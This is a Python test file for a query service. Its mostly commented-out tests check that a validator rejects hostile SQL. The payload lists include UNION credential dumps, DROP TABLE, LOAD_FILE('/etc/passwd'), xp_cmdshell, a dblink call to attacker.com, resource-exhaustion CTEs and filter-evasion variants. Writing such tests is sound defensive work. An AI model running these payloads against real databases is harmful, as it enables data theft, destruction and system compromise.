"""
Tests for the query service
"""
from unittest.mock import Mock

import pytest

from app.services.exceptions import BadQuery
from app.services.query_service import QueryService


class TestQueryService:

    @pytest.fixture(autouse=True)
    def setup(self):
        self.service = QueryService(settings=Mock())

#     def _run_queries_and_assert_bad_query_exception_raised(self, queries):
#         for query in queries:
#             with pytest.raises(BadQuery):
#                 self.service.execute_query(query)

#     def test_sql_injection_attempt(self):
#         queries = [
#             "' UNION SELECT username, password FROM admin_users--",
#             "' OR '1'='1",
#             "'; WAITFOR DELAY '00:00:05'--",
#             "'; DROP TABLE users; --"
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_with_clause_injection(self):
#         queries = [
#             "WITH cte AS (SELECT * FROM users) SELECT * FROM cte; DROP TABLE users; --",
#             "WITH cte AS (SELECT * FROM users) SELECT * FROM cte WHERE username = 'admin' OR '1'='1'; --",
#             "WITH malicious AS (SELECT * FROM sensitive_table) SELECT * FROM malicious",
#             """WITH RECURSIVE bomb AS (
#     SELECT 1 as n
#     UNION ALL
#     SELECT n+1 FROM bomb WHERE n < 1000000
# ) SELECT COUNT(*) FROM bomb"""
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_authorization_bypass_attempts(self):
#         queries = [
#             "WITH admin_data AS (SELECT * FROM admin_users WHERE role = 'admin') SELECT * FROM admin_data",
#             "SELECT * FROM information_schema.tables",
#             "SELECT table_name FROM information_schema.tables WHERE table_schema = 'mysql'"
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_data_exfiltration_attempts(self):
#         queries = [
#             "SELECT @@version, @@datadir, USER()",  # Database fingerprinting
#             """WITH schema_info AS (
#     SELECT table_name, column_name
#     FROM information_schema.columns
# ) SELECT * FROM schema_info""",  # Schema enumeration
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_resource_exhaustion_attempts(self):
#         queries = [
#             # Cartesian product bomb
#             """WITH evil AS (
#     SELECT * FROM large_table1 CROSS JOIN large_table2 CROSS JOIN large_table3
# ) SELECT COUNT(*) FROM evil""",
#             # Infinite recursion
#             """WITH RECURSIVE endless AS (
#     SELECT 1
#     UNION ALL
#     SELECT 1 FROM endless
# ) SELECT * FROM endless""",
#             # Heavy computation
#             "SELECT * FROM users WHERE password = MD5(CONCAT(RAND(), password))"""
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_function_procedure_abuse_attempts(self):
#         queries = [
#             "SELECT LOAD_FILE('/etc/passwd')",  # File system access
#             "SELECT SLEEP(10)",  # Induce delay
#             "SELECT BENCHMARK(1000000, MD5('test'))",  # CPU exhaustion
#             "SELECT * FROM dblink('host=attacker.com', 'SELECT version()')",  # Network requests
#             "EXEC xp_cmdshell 'dir'"  # System command execution
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_parameter_manipulation_attempts_adds_always_limits(self):
#         queries = [
#             "SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
#             "SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --",
#             "SELECT * FROM products WHERE name = ''; UNION SELECT credit_card_number, expiration_date FROM credit_cards; --"
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_complex_cte_exploitation_attempts(self):
#         queries = [
#             # Multi-level data extraction
#             """WITH 
# users_data AS (SELECT * FROM users),
# admin_data AS (SELECT * FROM admin_users),
# combined AS (
#     SELECT 'user' as type, username, password FROM users_data
#     UNION ALL
#     SELECT 'admin' as type, username, password FROM admin_data
# )
# SELECT * FROM combined""",
#             # Privilege escalation via CTE
#             """WITH elevated AS (
#     UPDATE user_roles SET role = 'admin' WHERE user_id = 1 RETURNING *
# ) SELECT * FROM elevated"""
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)

#     def test_validation_bypass_techniques(self):
#         queries = [
#             "SeLeCt * FrOm UsErS",
#             "SELECT/**/username/**/FROM/**/users",
#             "SELECT CONCAT('us','ers')",
#             "SELECT 0x61646D696E"
#         ]
#         self._run_queries_and_assert_bad_query_exception_raised(queries)
